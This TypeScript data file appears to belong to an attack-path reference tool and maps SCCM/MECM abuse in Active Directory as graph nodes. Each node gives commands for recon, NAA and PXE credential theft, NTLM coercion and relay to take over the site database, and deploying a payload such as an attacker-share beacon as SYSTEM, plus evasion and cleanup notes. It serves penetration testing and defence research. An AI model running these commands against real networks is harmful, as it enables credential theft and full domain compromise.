import type { AttackEdge, TechniqueNodeDef } from '../schema';

const r = String.raw;
const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/** SCCM / MECM (Configuration Manager) abuse (web-verified, Misconfiguration Manager taxonomy). */
export const adSccmNodes: TechniqueNodeDef[] = [
  {
    id: 'sccm-recon',
    label: 'SCCM Site Discovery',
    phase: 'enumeration',
    summary: 'Locate management points, site servers & SMS providers via LDAP/SMB.',
    description:
      'SCCM/MECM infrastructure is published to AD: management points, the System Management container, PXE-enabled distribution points, and host-naming conventions are discoverable by any authenticated user. sccmhunter\'s find module queries LDAP for these objects and profiles likely site systems, the targets the rest of the branch depends on (Misconfiguration Manager RECON-1/2).',
    tools: [
      { name: 'sccmhunter', url: 'https://github.com/garrettfoster13/sccmhunter' },
      { name: 'SharpSCCM', url: 'https://github.com/Mayyhem/SharpSCCM' },
    ],
    commands: [
      { label: 'Find SCCM site systems via LDAP', code: r`python3 sccmhunter.py find -u 'lowpriv' -p 'P@ssw0rd' -d internal.lab -dc-ip 10.10.100.100`, lang: 'bash' },
      { label: 'Identify site servers from Windows', code: r`SharpSCCM.exe get site-info`, lang: 'powershell' },
    ],
    references: [{ label: 'Misconfiguration Manager, RECON-1', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/RECON/RECON-1/recon-1_description.md' }],
    requires: ['Any valid domain account (authenticated LDAP enumeration)'],
    opsec: 'Authenticated LDAP queries are low-noise and look like normal directory traffic. The find module is read-only against AD; no writes to SCCM occur.',
    difficulty: 'easy',
  },
  {
    id: 'sccm-naa-creds',
    label: 'Extract NAA Credentials',
    phase: 'credential-access',
    summary: 'Register a rogue client, request machine policy, deobfuscate NAA creds.',
    description:
      'With SCCM/AD defaults, any domain user can register a device as an SCCM client, request the machine policy from a management point, and deobfuscate the Network Access Account creds in the NAAConfig policy (CRED-2). On an existing client the same secrets can be recovered locally from DPAPI blobs (CRED-3). NAAs are domain accounts and frequently over-privileged.',
    tools: [
      { name: 'SharpSCCM', url: 'https://github.com/Mayyhem/SharpSCCM' },
      { name: 'sccmhunter', url: 'https://github.com/garrettfoster13/sccmhunter' },
    ],
    commands: [
      { label: 'Request policy & recover secrets (CRED-2)', code: r`SharpSCCM.exe get secrets -mp <MANAGEMENT_POINT> -sc <SITE_CODE>`, lang: 'powershell' },
      { label: 'Recover NAA secrets from local DPAPI (CRED-3, needs local admin)', code: r`SharpSCCM.exe local secrets -m disk`, lang: 'powershell' },
    ],
    references: [
      { label: 'Misconfiguration Manager, CRED-2 (NAA via policy)', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md' },
      { label: 'GuidePoint, Compromising NAAs', url: 'https://www.guidepointsecurity.com/blog/sccm-exploitation-compromising-network-access-accounts/' },
    ],
    requires: ['Any valid domain account (CRED-2) or local admin on a client (CRED-3)', 'SCCM site using NAAs with defaults'],
    opsec: 'Registering a rogue device creates an AD computer object and an SCCM client record, both auditable. DPAPI recovery (CRED-3) is local and quieter but needs admin on the client. Clean up the registered device.',
    difficulty: 'medium',
  },
  {
    id: 'sccm-pxe-creds',
    label: 'PXE Boot Media Creds',
    phase: 'credential-access',
    summary: 'Pull & decrypt PXE boot media from a PXE-enabled DP, no auth needed.',
    description:
      'PXE-enabled distribution points serve OS-deployment boot media over TFTP, and the policies inside (NAAConfig, TaskSequence) carry credential material. An unauthenticated attacker can locate the PXE DP via DHCPDISCOVER, pull the media, and use cleartext secrets or crack the protecting password offline (CRED-1). One of the few SCCM attacks needing no domain credentials.',
    tools: [
      { name: 'PXEThief', url: 'https://github.com/MWR-CyberSec/PXEThief' },
      { name: 'hashcat', url: 'https://hashcat.net/hashcat/' },
    ],
    commands: [
      { label: 'Discover PXE media & extract secrets', code: r`python3 pxethief.py 1`, lang: 'bash' },
      { label: 'Crack a password-protected media blob offline', code: r`hashcat -m 19850 pxe.hash rockyou.txt`, lang: 'bash' },
    ],
    references: [{ label: 'Misconfiguration Manager, CRED-1 (PXE)', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md' }],
    requires: ['Network access to a PXE-enabled distribution point (no credentials)'],
    opsec: 'A sudden boot-media pull from an unexpected host can stand out; cracking is offline and invisible. Verify the current hashcat mode for protected PXE media against PXEThief docs before relying on it.',
    difficulty: 'medium',
  },
  {
    id: 'sccm-relay-mssql',
    label: 'Relay to Site MSSQL (Takeover)',
    phase: 'priv-esc',
    summary: 'Coerce the site server, relay NTLM to the site DB, grant Full Admin.',
    description:
      'When the site database runs on a separate host, coerce NTLM from a site server and relay it to MSSQL, where the site-server account is db_owner. Then INSERT yourself into RBAC_Admins / RBAC_ExtendedPermissions to grant the Full Administrator role: full hierarchy takeover (TAKEOVER-1). sccmhunter generates the SID + SQL; ntlmrelayx performs the relay.',
    tools: [
      { name: 'Impacket ntlmrelayx', url: 'https://github.com/fortra/impacket' },
      { name: 'sccmhunter', url: 'https://github.com/garrettfoster13/sccmhunter' },
      { name: 'PetitPotam', url: 'https://github.com/topotam/PetitPotam' },
    ],
    commands: [
      { label: 'Generate SID + SQL to grant Full Admin', code: r`python3 sccmhunter.py mssql -u 'lowpriv' -p 'P@ssw0rd' -d internal.lab -dc-ip 10.10.100.100 -tu lowpriv -sc PS1 -stacked`, lang: 'bash' },
      { label: 'Relay coerced site-server auth to the site DB', code: r`impacket-ntlmrelayx -smb2support -ts -t mssql://<DATABASE_IP> -q "USE CM_PS1; INSERT INTO RBAC_Admins (...) VALUES (...);"`, lang: 'bash' },
      { label: 'Coerce the site server to authenticate', code: r`python3 PetitPotam.py -u lowpriv -p 'P@ssw0rd' -d internal.lab <RELAY_IP> <SITE_SERVER_IP>`, lang: 'bash' },
    ],
    references: [
      { label: 'SpecterOps, SCCM Hierarchy Takeover', url: 'https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087' },{ label: 'Misconfiguration Manager, TAKEOVER-1', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/TAKEOVER-1/takeover-1_description.md' }],
    requires: ['Valid domain credentials', 'Site DB on a separate host', 'SMB to site server + MSSQL from relay to DB', 'NTLM/EPA defaults'],
    mitre: mitre('T1557.001'),
    opsec: 'Coercion and a new RBAC_Admins row are detectable; SQL writes are visible to anyone auditing the site DB. Remove planted admin rows when finished.',
    difficulty: 'hard',
  },
  {
    id: 'sccm-relay-clientpush',
    label: 'Relay Client Push (Elevate)',
    phase: 'priv-esc',
    summary: 'Abuse automatic client push to coerce the site server, relay its auth.',
    description:
      'If automatic client push is enabled, any low-priv user can register a rogue device pointing at an attacker host and send a heartbeat DDR, causing the primary site server to push the agent, authenticating to you with the client-push account and/or the site-server machine account (ELEVATE-2). Relay that to SMB on another site system for local admin, or to LDAP(S) on a DC for Shadow Credentials / RBCD.',
    tools: [
      { name: 'SharpSCCM', url: 'https://github.com/Mayyhem/SharpSCCM' },
      { name: 'Impacket ntlmrelayx', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Trigger client push to coerce the site server', code: r`SharpSCCM.exe invoke client-push -sms <SMS_PROVIDER> -sc <SITE_CODE> -t <RELAY_IP>`, lang: 'powershell' },
      { label: 'Relay to SMB on another site system (local admin)', code: r`impacket-ntlmrelayx -smb2support -ts -t <RELAY_TARGET_IP> -i`, lang: 'bash' },
      { label: 'Or relay to LDAPS on a DC (Shadow Creds / RBCD)', code: r`impacket-ntlmrelayx -t ldaps://<DC_IP> -smb2support --no-smb-server -i`, lang: 'bash' },
    ],
    references: [{ label: 'Misconfiguration Manager, ELEVATE-2', url: 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/ELEVATE/ELEVATE-2/ELEVATE-2_description.md' }],
    requires: ['Any valid domain account', 'Automatic client push enabled + NTLM fallback', 'Relay target without SMB signing / EPA'],
    mitre: mitre('T1557.001'),
    opsec: 'Registering a rogue client and triggering a push leaves SCCM records and install attempts. Its prerequisites (auto push + NTLM fallback + auto device approval) are non-default in hardened sites, so success is environment-dependent.',
    difficulty: 'hard',
  },
  {
    id: 'sccm-deploy-app',
    label: 'Deploy App as SYSTEM',
    phase: 'lateral-movement',
    summary: 'As an SCCM admin, deploy an app/script to run as SYSTEM on targets.',
    description:
      'With Full Administrator or Application Administrator rights, create an application/script deployment targeting any device or collection and run it in the SYSTEM context (EXEC-1/2). SharpSCCM automates the flow: create a collection, add the target, create the app with a payload, deploy, and force a policy refresh. This is the post-exploitation payoff: fan out to managed endpoints as SYSTEM.',
    tools: [{ name: 'SharpSCCM', url: 'https://github.com/Mayyhem/SharpSCCM' }],
    commands: [
      { label: 'Deploy a command to a device as SYSTEM', code: r`SharpSCCM.exe exec -d <DEVICE> -p "C:\Windows\System32\cmd.exe /c <payload>" -s`, lang: 'powershell' },
      { label: 'Deploy to an existing collection as SYSTEM', code: r`SharpSCCM.exe exec -n <COLLECTION_NAME> -p "\\attacker\share\beacon.exe" -s`, lang: 'powershell' },
    ],
    mitre: mitre('T1072'),
    references: [{ label: 'MITRE T1072, Software Deployment Tools', url: 'https://attack.mitre.org/techniques/T1072/' }],
    requires: ['SCCM Full Administrator or Application Administrator role', 'Reachability to the SMS Provider / management point'],
    opsec: 'Deployments are logged in SCCM and leave deployment objects, collections, and client execution records. Scope to specific devices and clean up created objects.',
    difficulty: 'medium',
  },
];

export const adSccmEdges: AttackEdge[] = [
  { source: 'ad-cat-sccm', target: 'sccm-recon' },
  { source: 'sccm-recon', target: 'sccm-naa-creds' },
  { source: 'sccm-recon', target: 'sccm-pxe-creds' },
  { source: 'sccm-pxe-creds', target: 'valid-domain-creds', label: 'domain account cleartext' },
  { source: 'sccm-recon', target: 'sccm-relay-mssql' },
  { source: 'sccm-recon', target: 'sccm-relay-clientpush' },
  { source: 'sccm-recon', target: 'sccm-deploy-app' },
  { source: 'sccm-naa-creds', target: 'valid-domain-creds', label: 'domain account cleartext' },
  { source: 'sccm-relay-mssql', target: 'domain-admin' },
  // client-push relay yields local admin on a site system (or shadow-creds/RBCD via
  // LDAP), NOT DA directly; the SCCM→DA path is sccm-relay-mssql (Full Admin).
  { source: 'sccm-relay-clientpush', target: 'local-admin-host' },
  { source: 'sccm-deploy-app', target: 'local-admin-host' },
];
